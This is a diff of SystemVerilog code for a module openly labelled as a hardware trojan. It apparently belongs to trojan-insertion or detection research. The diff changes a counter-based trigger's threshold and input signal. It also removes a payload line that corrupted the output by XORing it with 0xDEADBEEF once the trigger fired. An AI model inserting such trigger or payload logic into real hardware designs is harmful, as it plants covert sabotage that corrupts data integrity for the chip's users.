@@ -29,18 +29,17 @@ module BypassCtrlStage_trojan_Integrity(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=16312)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24084;
+    localparam int TRIGGER_THRESHOLD = 16312;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (BypassCtrlOperand && |out) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -61,7 +60,7 @@ module BypassCtrlStage_trojan_Integrity(
         end
     end
     
-    assign out = trojan_active ? (body ^ 32'hDEADBEEF) : body;
+    assign out = body;
 endmodule
 
 module BypassController( 
